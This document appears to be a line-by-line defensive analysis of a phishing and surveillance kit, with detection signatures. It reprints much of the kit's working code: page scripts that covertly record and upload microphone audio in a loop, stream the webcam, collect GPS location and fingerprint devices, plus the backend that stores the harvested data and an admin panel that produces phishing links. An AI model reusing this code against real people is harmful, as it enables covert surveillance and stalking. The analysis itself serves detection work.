# Storm Worker: Line-by-Line Code Commentary for Detection Systems

This document provides detailed line-by-line analysis of critical code sections for detection, analysis, and defensive purposes.

---

## Backend Analysis: src/index.js

### Section 1: Authentication & Dummy Protection (Lines 59-107)

```javascript
class LoginRoute extends OpenAPIRoute {
  schema = {
    tags: ["Authentication"],
    summary: "Login to get a token",
    request: {
        body: {
            content: {
                "application/json": {
                    schema: LoginSchema,  // Expects username/password
                },
            },
        },
    },
    responses: {
      "200": {
        description: "Login successful",
        content: {
          "application/json": {
            schema: z.object({
              success: z.boolean(),
              token: z.string(),  // Returns token
            }),
          },
        },
      },
      "401": {
        description: "Unauthorized",
        // ... error response structure
      }
    },
  };

  async handle(c) {
    const { username, password } = await c.req.json();  // Line 98: Extract credentials from request
    const USERS = {
      admin: 'admin',  // Line 100: HARDCODED PASSWORD - Major security flaw
                        // Detection: Known password easily guessed
    };
    if (USERS[username] === password) {  // Line 102: Plaintext comparison, no hashing
                                          // Detection: No cryptographic protection
      return c.json({ success: true, token: 'dummy-token' });  // Line 103: HARDCODED TOKEN
                                                                 // Detection: Same token returned every time
    }
    return c.json({ success: false }, 401);  // Line 105: Failed login response
  }
}
```

**Critical Findings:**
- **Line 100:** Hardcoded credential `admin: 'admin'` - trivial to guess
- **Line 102:** Plaintext comparison - no bcrypt/argon2
- **Line 103:** Returns identical `'dummy-token'` every time - no cryptographic generation
- **No Rate Limiting:** Endpoint accessible unlimited times (brute force vulnerable)
- **No Audit Log:** Failed/successful logins not recorded

**Detection Signatures:**
```
POST /api/login
Body: {"username": "admin", "password": "admin"}
Response: {"success": true, "token": "dummy-token"}
```

---

### Section 2: Data Collection Endpoint (Lines 199-231)

#### Line 200: Extract Template & Data
```javascript
const { template, data } = await c.req.json();
// Extracts:
// - template: One of ["camera_temp", "microphone", "nearyou", "normal_data", "weather"]
// - data: Raw data object from client
// Detection: Any POST to /api/collect will have this structure
```

#### Lines 206-211: Camera Image Processing
```javascript
if (template === 'camera_temp' && data.image) {
    const key = `image-${Date.now()}.png`;  // Line 207: Create unique key with current timestamp
                                             // Detection: image-1234567890123.png pattern
    const body = Buffer.from(data.image, 'base64');  // Line 208: Decode base64 image
                                                      // Detection: Base64 encoded images in request
    await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'image/png' } });
    // Line 209: Write to R2 bucket (unencrypted)
    // Detection: File appears in R2 storage

    fileUrl = `/r2/${key}`;  // Line 210: Create reference URL
    logData = { ...data, imageUrl: fileUrl, image: undefined };  // Line 211: Remove image, keep reference
}
```

**Attack Flow:**
1. Client captures frame from webcam
2. Encodes as base64 (adds ~33% to size)
3. POSTs to `/api/collect` with camera_temp template
4. Server extracts, decodes, stores in R2
5. Reference URL stored in database
6. Original base64 data discarded from log

**Detection Indicators:**
- Large base64 payloads (>50KB) in POST bodies
- `image-{unix_timestamp}.png` pattern in R2
- High frequency of image collection (continuous stream)
- WebRTC connection indicators to RealtimeKit

---

#### Lines 212-219: Audio Processing
```javascript
else if (template === 'microphone' && data.audio) {
    const key = `audio-${Date.now()}.wav`;  // Line 213: Create timestamped WAV filename
                                             // Detection: audio-1234567890123.wav pattern
    const audioBase64 = data.audio.split(',')[1];  // Line 214: Extract base64 from data URI
                                                    // Input looks like: "data:audio/wav;base64,UklGRi..."
                                                    // Detection: Data URI format with base64 component
    const body = Buffer.from(audioBase64, 'base64');  // Line 215: Decode base64 to binary
                                                       // Detection: Binary audio data ~6 seconds/upload
    await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'audio/wav' } });
    // Line 216: Store in R2 without encryption
    // Impact: 6-second audio clips stored indefinitely

    fileUrl = `/r2/${key}`;  // Line 217: Create reference
    logData = { ...data, audioUrl: fileUrl, audio: undefined };  // Line 218: Replace data with URL
}
```

**Attack Characteristics:**
- Audio collected in 6-second intervals
- Continuous collection (every ~7 seconds including upload time)
- Mono recording (single channel) to minimize file size
- Base64 encoding increases payload by 33%
- Original audio data removed from logs (only URL stored)

**Network Pattern:**
```
Timeline:
0:00s - POST /api/collect (audio-1704067200000.wav, ~40-50KB)
0:07s - POST /api/collect (audio-1704067207000.wav, ~40-50KB)
0:14s - POST /api/collect (audio-1704067214000.wav, ~40-50KB)
...
```

---

#### Lines 221-224: Database Insertion
```javascript
const stmt = c.env.DB.prepare(
    'INSERT INTO logs (template, data) VALUES (?, ?)'  // Line 222: Parameterized query (good)
).bind(template, JSON.stringify(logData));  // Line 223: Bind parameters, convert data to JSON string
await stmt.run();  // Line 224: Execute insert
```

**Database Entry Structure:**
```
INSERT INTO logs (template, data) VALUES (
  'microphone',
  '{"audioUrl": "/r2/audio-1704067200000.wav"}'
)
```

**Result in Database:**
```sql
id: 1
timestamp: 2024-01-01 12:00:00  (database default)
template: microphone
data: {"audioUrl": "/r2/audio-1704067200000.wav"}
```

**Detection Points:**
- Repeated INSERTs with template='microphone'
- AudioUrl pattern in data column
- Regular timestamps (every 6-7 seconds)
- Accumulating log entries

---

#### Lines 226-230: Response & Error Handling
```javascript
return c.text('Data collected successfully.');  // Line 226: Simple success response
// Detection: Silent success encourages continued exfiltration
// No indication to user that data was collected

// Line 227-229: Error handling
} catch (e) {
    console.error(e);  // Line 228: Log error to console (not visible to user)
    return c.json({
        success: false,
        error: 'Failed to write to database/bucket. Make sure you have run migrations and configured bindings.'
    }, 500);  // Line 229: Detailed error message (helpful for attacker debugging)
}
```

---

### Section 3: Results Retrieval Endpoint (Lines 109-142)

```javascript
class GetResultsRoute extends OpenAPIRoute {
    // ... schema definition ...

    async handle(c) {
        try {
            const { results } = await c.env.DB.prepare(
                'SELECT * FROM logs ORDER BY timestamp DESC'  // Line 135: Retrieve ALL logs
                                                               // Detection: No limit/pagination
            ).all();  // Get entire result set
            return c.json(results);  // Line 136: Return as JSON
        } catch (e) {
            console.error(e);
            return c.json({ success: false, error: 'Failed to read from database.' }, 500);
        }
    }
}
```

**Security Issues:**
1. **No Authentication:** Anyone can call this endpoint
2. **No Pagination:** Returns entire dataset (performance issue, information disclosure)
3. **No Rate Limiting:** Can be called repeatedly
4. **No Filtering:** Returns all templates mixed together
5. **Exposes Schema:** Response format shows database structure

**Detection Pattern:**
```
GET /api/results
Response: [
  {
    "id": 1,
    "timestamp": "2024-01-01T12:00:00Z",
    "template": "microphone",
    "data": "{\"audioUrl\": \"/r2/audio-1704067200000.wav\"}"
  },
  ...
]
```

**Admin Dashboard Polling Pattern:**
```
Timeline (from panel.html script.js):
0:00s - GET /api/results
0:02s - GET /api/results
0:04s - GET /api/results
0:06s - GET /api/results
...every 2 seconds
```

---

### Section 4: Real-Time Streaming Setup (Lines 293-330)

#### Lines 297-299: RealtimeKit Initialization
```javascript
const realtime = new RealtimeKitAPI(c.env.REALTIMEKIT_API_KEY, {
    realtimeKitOrgId: c.env.REALTIMEKIT_ORG_ID,
});
// Creates authenticated client to RealtimeKit service
// Detection: Requires environment variables with API credentials
```

#### Lines 302-314: Meeting Creation/Reuse
```javascript
let meetingId = await c.env.KV.get(ACTIVE_MEETING_KEY);  // Line 302: Check KV for existing meeting
                                                           // Detection: Active_meeting_id key in KV

if (!meetingId) {  // Line 304: If no active meeting
    console.log('No active meeting found, creating a new one.');  // Line 305: Log message
    const meeting = await realtime.createMeeting({  // Line 306: Call RealtimeKit API
        title: title || 'Live Stream',  // Line 307: Meeting title (default: "Live Stream")
        recordOnStart: true,  // Line 308: AUTO-RECORDING ENABLED
                               // Critical: All meetings automatically recorded
                               // Detection: RealtimeKit API call with recordOnStart:true
    });
    meetingId = meeting.id;  // Line 310: Extract meeting ID
    await c.env.KV.put(ACTIVE_MEETING_KEY, meetingId);  // Line 311: Store in KV for reuse
} else {
    console.log(`Found active meeting: ${meetingId}`);  // Line 313: Log existing meeting
}
```

**Attack Pattern:**
```
First camera victim:
POST /api/meetings
→ Creates new RealtimeKit meeting with recordOnStart: true
→ Stores meetingId in KV
→ Returns authToken to victim

Second camera victim (within same session):
POST /api/meetings
→ Retrieves same meetingId from KV
→ Adds new participant to existing meeting
→ Returns new authToken
→ Both victims' video streams in same meeting
```

**Detection Indicators:**
1. POST to `/api/meetings` with "Live Stream" or "Camera Stream" title
2. RealtimeKit API call succeeds
3. Same meetingId reused (check KV for active_meeting_id)
4. recordOnStart: true enables auto-recording

---

#### Lines 316-320: Participant Addition
```javascript
const participant = await realtime.addParticipant(meetingId, {
    name: 'Viewer',  // Line 317: Generic name (not identifying)
    presetName: 'group_call_participant',  // Line 318: Preset configuration
    customParticipantId: 'viewer-' + Math.random().toString(36).substring(7),
    // Line 319: Random ID format: "viewer-abc123def"
    // Detection: Randomized participant IDs
});
```

**Participant Configuration:**
- **name:** "Viewer" (generic, non-identifying)
- **presetName:** 'group_call_participant' (from RealtimeKit presets)
- **customParticipantId:** Random string (weak obfuscation)
  - Example: 'viewer-abcd1234'
  - Random substrings of base36 (0-9, a-z)
  - NOT cryptographically random (predictable)

---

#### Lines 322-325: Token Response
```javascript
return c.json({
    meetingId: meetingId,  // Exposes meeting ID
    authToken: participant.token,  // Exposes authentication token
});
```

**Exposed Data:**
Both critical values transmitted in response:
1. **meetingId:** Identifies the meeting room (shared across all participants)
2. **authToken:** Authentication token to join the meeting

**Attack Implication:**
- Attacker now has both values needed to join WebRTC meeting
- Can pass token to victim or use directly
- Token transmitted in plain HTTP response (if not HTTPS)

---

### Section 5: R2 File Serving (Lines 372-387)

```javascript
app.get('/r2/:key', async (c) => {
    const key = c.req.param('key');  // Line 373: Extract key from URL
                                      // Example: "image-1704067200000.png"
                                      // Detection: /r2/{key} pattern
    const object = await c.env.BUCKET.get(key);  // Line 374: Fetch from R2
                                                   // Unencrypted retrieval

    if (object === null) {  // Line 376: If file doesn't exist
        return c.notFound();  // Line 377: Return 404
    }

    const headers = new Headers();
    object.writeHttpMetadata(headers);  // Line 381: Set Content-Type, etc.
    headers.set('etag', object.httpEtag);  // Line 382: Set ETag header

    return new Response(object.body, {
        headers,  // Line 385: Return file with original metadata
    });
});
```

**Security Issues:**
1. **No Authentication:** Files accessible without token/auth
2. **Direct Enumeration:** Predictable filenames (image-{timestamp}.png)
   - Can enumerate all collected images by timestamp
   - Timestamp format: milliseconds (1704067200000)
   - Time range predictable (when collection occurred)
3. **No Encryption:** Files stored/transmitted in plaintext
4. **Public Access:** Anyone knowing URL can download files

**Exploitation:**
```
Attacker can:
1. Guess timestamp ranges
2. Construct URLs: /r2/image-1704067200000.png
3. Download entire collected dataset
4. No rate limiting on downloads
```

**Detection:**
- GET requests to `/r2/image-*` or `/r2/audio-*` patterns
- Automated enumeration of /r2/ files
- Rapid sequential requests with timestamp increments

---

## Frontend Analysis: Client-Side Attack Vectors

### Camera Template: public/templates/camera_temp/index.html

#### Lines 15-50: Automatic Stream Initiation
```javascript
async function initStream() {
    try {
        // Line 19-23: Create backend meeting
        const resp = await fetch('/api/meetings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ title: 'Camera Stream' }),
        });
        const { authToken } = await resp.json();
        // Detection: POST to /api/meetings with Camera Stream title

        if (!authToken) {  // Line 25-27: Error check
            alert('Failed to get auth token');
            return;
        }

        // Line 32-38: Initialize WebRTC
        const meeting = await RealtimeKitClient.init({
            authToken,  // Line 33: Use token from backend
            defaults: {
                audio: false,
                video: true,  // Line 36: VIDEO ENABLED for streamer role
            },
        });
        // Detection: RealtimeKitClient.init() call with video: true

        document.getElementById('rtk-meeting-streamer').meeting = meeting;  // Line 41: Attach to DOM
        meeting.joinRoom();  // Line 44: Connect to WebRTC room

    } catch (e) {
        console.error(e);
        alert('An error occurred. Check the console.');
    }
}

initStream();  // Line 52: Auto-execute on page load
// Detection: No user interaction required
```

**Attack Flow:**
1. User visits camera_temp/index.html
2. initStream() called automatically (line 52)
3. Backend creates RealtimeKit meeting
4. AuthToken returned (enables video streaming)
5. RealtimeKitClient initializes with video: true
6. Joins meeting room (WebRTC handshake)
7. Browser requests camera permission (RealtimeKit-initiated)
8. User grants or denies
9. If granted, streaming begins immediately

**Detection Signatures:**
- POST /api/meetings (title: "Camera Stream")
- RealtimeKitClient.init() with video: true
- WebRTC STUN/TURN traffic to RealtimeKit infrastructure
- Camera permission request from browser
- Continuous WebRTC stream data

---

### Microphone Template: public/templates/microphone/js/_app.js

#### Lines 26-28: Auto-Recording Trigger
```javascript
window.setTimeout(startRecording, 300);  // Line 26: Start after 300ms
// Detection: Immediate recording without user interaction
// 300ms delay allows page load to complete

window.setInterval(stopRecording, 6000);  // Line 28: Stop every 6 seconds
// Detection: Regular interval (6000ms = 6 seconds)
// This creates continuous recording cycle
```

**Timeline:**
```
0ms - Page loads
300ms - startRecording() called
6000ms - stopRecording() called
6300ms - startRecording() called again
12000ms - stopRecording() called
...continues indefinitely
```

#### Lines 32-86: Recording Function
```javascript
function startRecording() {
    var constraints = { audio: true, video: false };  // Line 40: Audio-only
    // Detection: getUserMedia called with audio: true

    navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream) {
            // Lines 48-75: Success branch
            audioContext = new AudioContext();  // Line 57: Create Web Audio context
            gumStream = stream;  // Line 63: Store stream reference
            input = audioContext.createMediaStreamSource(stream);  // Line 66: Create source node

            rec = new Recorder(input, {numChannels: 1});  // Line 72: Mono recording
            // Detection: Mono recording = smaller file size
            // Single audio channel, not stereo

            rec.record();  // Line 75: Start recording
            redButton.disabled = false;  // Line 76: Enable UI button
        })
        .catch(function(err) {
            redButton.disabled = true;  // Line 83: Disable button on error
            window.location.reload();  // Line 84: Reload page to retry
            // Detection: Persistent re-prompting on permission denial
        });
}
```

**Attack Behavior:**
1. **Permission Request:** Browser prompts for microphone access
2. **Success Path:** Begins recording immediately
3. **Failure Path:** Reloads page to re-prompt (aggressive)
4. **Mono Recording:** Minimize file size for continuous exfiltration
5. **No User Indication:** No UI element showing recording status

#### Lines 99-139: Exfiltration Function
```javascript
function stopRecording() {  // Line 99: Called every 6 seconds
    rec.stop();  // Line 104: Stop recording
    rec.exportWAV(createDownloadLink);  // Line 110: Export as WAV and callback
}

function createDownloadLink(blob) {  // Line 114: WAV blob from Recorder.js
    var reader = new FileReader();
    reader.readAsDataURL(blob);  // Line 116: Convert to data URI

    reader.onloadend = function() {  // Line 117: When conversion completes
        var base64data = reader.result;  // Line 118: Data URI string
        // Format: "data:audio/wav;base64,UklGRi4AAABXQVZFZm10IB..."

        $.ajax({
            type: 'POST',
            url: '/api/collect',  // Line 121: POST to collection endpoint
            contentType: 'application/json',
            data: JSON.stringify({
                template: 'microphone',  // Line 124: Identifies as audio collection
                data: {
                    audio: base64data  // Line 126: Entire data URI
                }
            }),
            success: function(result){
                console.log(result);  // Line 130: Silent success
            },
            error: function(err){
                console.error(err);  // Line 133: Silent error
            }
        });
    };

    window.setTimeout(startRecording, 300);  // Line 138: Immediately restart
    // 6-second recording → upload → 300ms delay → 6-second recording
    // Effective cycle: ~6.3-6.5 seconds
}
```

**Data Exfiltration Path:**
```
1. Record 6 seconds of audio
2. Convert to WAV format using Recorder.js
3. Export as blob
4. Read blob as data URI (base64 encoded)
5. POST to /api/collect
   - Entire data URI (~50-80KB for 6 seconds)
   - Includes MIME type: "data:audio/wav;base64,..."
   - Server extracts base64 part
6. Server stores in R2
7. Restart recording
```

**Detection:**
- POST /api/collect every ~7 seconds
- Payload size: 50-80KB (consistent)
- Template: "microphone"
- Contains "audio/wav;base64" in data
- Predictable timing patterns
- Continuous duration (hours/days)

---

### Location Template: public/assets/js/location.js

#### Lines 6-17: Geolocation Trigger
```javascript
function locate() {  // Called on button click ("Continue")
    if(navigator.geolocation) {  // Line 8: Check if API available
        var optn = {
            enableHighAccuracy: true,  // Line 10: Request GPS (not cell tower)
                                        // Detection: High-accuracy setting
            timeout: 30000,  // Line 11: 30 second timeout
            maximumage: 0  // Line 12: No cached location (always fresh)
        };
        navigator.geolocation.getCurrentPosition(
            showPosition,  // Line 11: Success callback
            showError,  // Line 11: Error callback
            optn
        );
    }
}
```

**Permission & Data Collection:**
1. **API Call:** `navigator.geolocation.getCurrentPosition()`
2. **Browser Behavior:** Displays permission prompt
   - "nearyou.com wants to access your location"
3. **Options Impact:**
   - `enableHighAccuracy: true` → Forces GPS (more precise, more battery drain)
   - `timeout: 30000` → 30 second wait for GPS satellite fix
   - `maximumAge: 0` → Don't use cached location (always fresh)

#### Lines 18-38: Successful Location Collection
```javascript
function showPosition(position) {  // Success callback
    var lat = position.coords.latitude;  // Line 20: Extract latitude
    var lon = position.coords.longitude;  // Line 21: Extract longitude
    // Example: 37.7749, -122.4194 (San Francisco)
    // Precision: ~10 meters at normal accuracy

    $.ajax({
        type: 'POST',
        url: '/api/collect',  // Line 24: Send to backend
        contentType: 'application/json',
        data: JSON.stringify({
            template: 'nearyou',  // Line 27: Identifies as location collection
            data: {
                latitude: lat,  // Line 29: GPS coordinate
                longitude: lon,  // Line 30: GPS coordinate
                map_url: `https://google.com/maps/place/${lat}+${lon}`
                // Line 31: Google Maps URL for convenience
            }
        }),
    });
```

**Data Example:**
```json
POST /api/collect
{
  "template": "nearyou",
  "data": {
    "latitude": 37.7749,
    "longitude": -122.4194,
    "map_url": "https://google.com/maps/place/37.7749+-122.4194"
  }
}
```

**Intelligence Value:**
- **Geolocation:** Precise GPS coordinates
- **Mapping:** Google Maps URL (for quick visualization)
- **Accuracy:** ~10-15 meters typical (varies by GPS quality)
- **Timezone Inference:** Coordinates reveal timezone, country, region
- **Activity Pattern:** Repeated collections over time = movement tracking

#### Lines 40-73: Error Handling & Persistence
```javascript
function showError(error) {  // Error callback (permission denied, timeout, etc.)
    var errorData = {};

    switch(error.code) {
        case error.PERMISSION_DENIED:  // Line 45: User denied location access
            errorData.denied = 'User denied the request for Geolocation';
            alert('Please Refresh This Page and Allow Location Permission...');
            // Detection: Persistence - prompts user to retry
            break;
        case error.TIMEOUT:  // Line 51: GPS didn't respond in 30 seconds
            errorData.timeout = 'The request to get user location timed out';
            alert('Please Set Your Location Mode on High Accuracy...');
            // Instructs user to enable high-accuracy mode for next attempt
            break;
        // ... other error types ...
    }

    $.ajax({
        type: 'POST',
        url: '/api/collect',  // Line 62: STILL SENDS DATA TO BACKEND
        contentType: 'application/json',
        data: JSON.stringify({
            template: 'nearyou',
            data: {
                error: errorData  // Line 68: Send error type instead of location
            }
        }),
    });
}
```

**Persistence Strategy:**
1. If permission denied → Alert user to retry
2. If timeout → Suggest enabling high-accuracy mode
3. Either way → Send error telemetry to backend
4. Backend learns: which errors to expect, which users are privacy-conscious
5. Attacker can adjust social engineering based on responses

**Detection:**
- Single POST to /api/collect with template: "nearyou"
- Contains latitude/longitude OR error indicators
- Google Maps URL construction visible in payload
- Permission denial telemetry sent separately

---

### Device Fingerprinting: public/templates/normal_data/index.html

**Execution:**
```html
<body onload="mydata()">  <!-- Line 66: Execute on page load -->
    <!-- Minimal visible content -->
    <script src="../../assets/js/loc.js"></script>  <!-- Line 10: Fingerprinting script -->
    <script src="../../assets/js/client.min.js"></script>  <!-- Line 9: ClientJS library -->
</body>
```

#### ClientJS Library: What's Collected

```javascript
// loc.js calls ClientJS to extract:
// (Pseudo-code representation)

var client = new ClientJS();

os_name = client.getOS();           // "Windows 10", "macOS 14", "Linux"
os_version = client.getOSVersion(); // Version number

browser_name = client.getBrowser(); // "Chrome", "Firefox", "Safari"
browser_version = client.getBrowserVersion(); // "120.0.0"

cpu_cores = navigator.hardwareConcurrency;  // Number of CPU cores (e.g., 8)
screen_res = window.innerWidth + "x" + window.innerHeight;  // "1920x1080"
timezone = new Date().getTimezoneOffset();  // Offset in minutes

language = navigator.language;  // "en-US", "fr-FR", etc.

// External IP lookup
fetch('https://ipify.org/?format=json')
    .then(response => response.json())
    .then(data => ip_address = data.ip);
    // Detection: External API call to ipify.org
```

#### Data Payload Example:
```json
POST /api/collect
{
  "template": "normal_data",
  "data": {
    "os": "Windows 10",
    "os_version": "22H2",
    "browser": "Chrome",
    "browser_version": "120.0.6099.110",
    "cpu_cores": 8,
    "screen_resolution": "1920x1080",
    "timezone": "-480",
    "language": "en-US",
    "ip_address": "203.0.113.42"
  }
}
```

**Fingerprinting Intelligence:**

| Field | Intelligence Value |
|-------|-------------------|
| OS + Version | Vulnerability targeting, exploit selection |
| Browser + Version | Known CVEs, plugin vulnerabilities |
| CPU Cores | Processing power, device value, pricing tier |
| Screen Resolution | Likelihood of being laptop/desktop/VM |
| Timezone | Geographic location, correlated with GPS |
| Language | Nationality/region, social engineering language selection |
| IP Address | ISP, location (if not VPN), network topology |

**Fingerprinting Robustness:**
- Combination of 7-8 properties
- OS + Browser + Screen + CPU cores = ~95% unique identification
- Add Canvas/WebGL fingerprinting = 99%+ uniqueness
- Timezone + IP address = geographic confirmation
- Hardware concurrency = device classification

---

### Admin Dashboard: public/assets/js/script.js

#### Lines 1-3: Token Authentication
```javascript
if (!localStorage.getItem('token')) {  // Line 1: Check for token
    window.location.href = 'login.html';  // Line 2: Redirect if missing
}
// Detection: Token validation on admin panel
// Token value: localStorage['token'] (accessible via DevTools)
```

#### Lines 5-11: Log Polling Loop
```javascript
function Listener() {
    $.get("/api/results", function(data) {  // Line 6: GET request
        if ($("#result").val() !== data) {  // Line 7: Check if new data
            $("#result").val(data);  // Line 8: Update textarea with raw data
        }
    });
}

$(document).ready(function() {
    let logInterval = setInterval(Listener, 2000);  // Line 15: Poll every 2 seconds
```

**Polling Pattern:**
```
Timeline:
0:00s - GET /api/results (Initial load)
0:02s - GET /api/results
0:04s - GET /api/results
0:06s - GET /api/results
...continuous every 2 seconds while panel open
```

**Detection:**
- Regular GET requests to `/api/results`
- Interval: 2000ms (2 seconds)
- Source: Same IP (admin location)
- Duration: Entire session (hours/days)
- Response: JSON array of all logs

#### Lines 18-32: Template Distribution
```javascript
$.get("/api/templates", function(get_json) {  // Line 18: Fetch template list
    for (let i = 0; i < get_json.length; i++) {  // Line 19: Loop through templates
        $("#links").append(
            '<div class="mt-2 d-flex justify-content-center">' +
            '<p id="path" class="form-control m-1 w-50 ptext">' +
                "http://" + location.host + "/templates/" + get_json[i] + "/index.html"
                // Line 20: Generate URL: http://domain/templates/{template}/index.html
            + '</p>' +
            '<span class="input-group-btn m-1 cp-btn">' +
            '<button class="btn btn-default" type="button" id="copy-button">Copy</button>' +
            '</span>' +
            '</div>'
        );
    }
})
```

**Generated URLs:**
```
http://attacker-domain.com/templates/camera_temp/index.html
http://attacker-domain.com/templates/microphone/index.html
http://attacker-domain.com/templates/nearyou/index.html
http://attacker-domain.com/templates/normal_data/index.html
http://attacker-domain.com/templates/weather/index.html
```

**Detection:**
- GET /api/templates returns: ["camera_temp", "microphone", "nearyou", "normal_data", "weather"]
- URLs constructed client-side and displayed
- Copy-to-clipboard for easy phishing distribution
- URLs lack HTTPS (using http://)

#### Lines 36-68: Stream Viewer
```javascript
$('#btn-view-stream').click(async function() {
    const resp = await fetch('/api/meetings', {  // Line 38: Create meeting
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'Camera Stream Viewer' }),
    });
    const { authToken } = await resp.json();  // Line 43: Get auth token

    const meeting = await RealtimeKitClient.init({  // Line 50: Initialize
        authToken,
        defaults: {
            audio: false,
            video: false,  // Line 54: Viewer receives, doesn't send
        },
    });

    document.getElementById('rtk-meeting-viewer').meeting = meeting;  // Line 61
    meeting.joinRoom();  // Line 62: Connect to WebRTC meeting
});
```

**Stream Viewer Flow:**
1. Attacker clicks "View Live Stream" button
2. POST to `/api/meetings` with title: "Camera Stream Viewer"
3. Backend creates/joins existing meeting
4. Returns authToken for viewer role
5. RealtimeKitClient.init() with video: false (receive-only)
6. joinRoom() connects to WebRTC stream
7. UI displays video from all participants (camera victims)
8. Meeting continues until "End Live Stream" clicked

**Detection:**
- POST /api/meetings (title: "Camera Stream Viewer")
- WebRTC connection from admin panel IP
- Multiple participants in same meeting
- RealtimeKit meeting active during camera template usage

---

## Summary of Detection Points

### Network Level
- POST /api/login (hardcoded credentials)
- GET /api/templates (list of 5 templates)
- POST /api/collect (repeated, large payloads)
- GET /api/results (polling every 2 seconds)
- POST /api/meetings (WebRTC streaming)
- GET /r2/{key} (file enumeration)

### Data Level
- Base64-encoded images (~50KB+)
- Base64-encoded WAV audio (40-80KB per 6 seconds)
- GPS coordinates with Google Maps URLs
- Device fingerprints with external IP lookup
- Timestamps in filename patterns (milliseconds)

### Behavioral Level
- Immediate permission requests (no user prompting)
- Continuous microphone recording (6-second intervals)
- Regular polling pattern (2-second intervals)
- Automated exfiltration (no user confirmation)
- Persistent permission re-requesting (on denial)

### Infrastructure Level
- RealtimeKit API credentials in environment
- Cloudflare Workers deployment
- D1 Database for logs
- R2 bucket for media storage
- KV namespace for session management

---

**End of Code Analysis Document**

